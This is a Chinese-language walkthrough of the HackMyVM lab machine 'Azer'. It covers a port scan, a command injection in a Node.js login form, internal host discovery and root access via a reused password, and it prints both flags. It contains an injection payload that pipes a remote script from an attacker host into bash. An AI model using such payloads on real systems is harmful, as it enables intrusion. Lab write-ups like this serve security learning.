# Azer

2024-11-03 https://hackmyvm.eu/machines/machine.php?vm=Azer

## IP

192.168.5.40

## Scan

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: L&#214;SEV | L&#246;semili &#199;ocuklar Vakf\xC4\xB1
3000/tcp open  http    Node.js (Express middleware)
|_http-title: Login Page
```

80 端口对应的 web 应用没找到利用点，看看 3000 的 nodejs 服务。首页是个登陆窗口，输入 1 和 1 发现会把参数传递到 sh 脚本执行：

```
Error executing bash script: Command failed: /home/azer/get.sh 1 1 fatal: not a git repository (or any of the parent directories): .git
```

可以实现命令注入，用;号分割

```
username=;curl+http://192.168.5.3/5.3/8888.sh|bash;&password=root
```

在 /home/azer 得到了 user flag：

```
azer@azer:~$ cat user.txt
0d2856d69dc348b3af80a0eed67c7502
```

继续提权到 root，peash 没发现提权路径，发现了另外一个内部网络：10.10.10.0/24 ，上传 nmap static file 进行扫描看是否能找到其他内部主机，发现另外一个存活的主机：10.10.10.10，对其端口扫描发现开放 80 端口,看看端口上显示什么：

```
azer@azer:~$ curl http://10.10.10.10
.:.AzerBulbul.:.
```

没发现其他目录或者文件，上面这串字符串也有可能是密码，尝试看看是不是 root 的密码，尝试成功，最后获得了 root flag：

```
root@azer:~# cat root.txt
b5d96aec2d5f1541c5e7910ccab527d8
```
